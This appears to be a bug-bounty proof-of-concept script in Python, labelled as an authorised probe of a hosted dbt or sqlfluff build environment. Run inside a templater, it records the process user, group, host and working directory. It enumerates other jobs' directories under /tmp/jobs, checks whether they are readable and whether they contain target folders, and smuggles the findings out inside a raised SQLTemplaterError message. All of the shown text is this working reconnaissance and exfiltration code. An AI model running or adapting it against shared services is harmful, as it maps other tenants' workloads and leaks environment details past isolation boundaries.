MARKER = 'A145F9_R1_1B2047C13A46'
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
Reads process-local directory NAMES, and the content of ONE file whose
name this researcher chose and planted. No environment, no network, no
instance metadata, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

try:
    out["cwd"] = os.getcwd()
    mine = _mine()
    out["mine_len"] = len(mine)
    out["uid"] = os.getuid()
    out["gid"] = os.getgid()
    out["host"] = __import__("socket").gethostname()
    base = "/tmp/jobs"
    now = time.time()
    es = sorted(os.listdir(base))
    out["n_entries"] = len(es)
    out["own_present"] = mine in es
    others = [e for e in es if e != mine]
    out["n_other"] = len(others)
    out["all_digit"] = all(e.isdigit() for e in es)
    out["name_lens"] = sorted(set(len(e) for e in es))
    rows = []
    for e in others:
        p = base + "/" + e
        try:
            age = int(now - os.stat(p).st_mtime)
        except Exception:
            age = -1
        rows.append([age,
                     1 if os.access(p, os.R_OK | os.X_OK) else 0,
                     1 if os.path.isdir(p + "/target") else 0])
    rows.sort()
    out["rows_age_readable_hastarget"] = rows[:45]
    out["n_other_readable"] = sum(1 for r in rows if r[1])
    out["n_other_with_target"] = sum(1 for r in rows if r[2])
    try:
        out["own_age"] = int(now - os.stat(base + "/" + mine).st_mtime)
    except Exception:
        out["own_age"] = -1
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
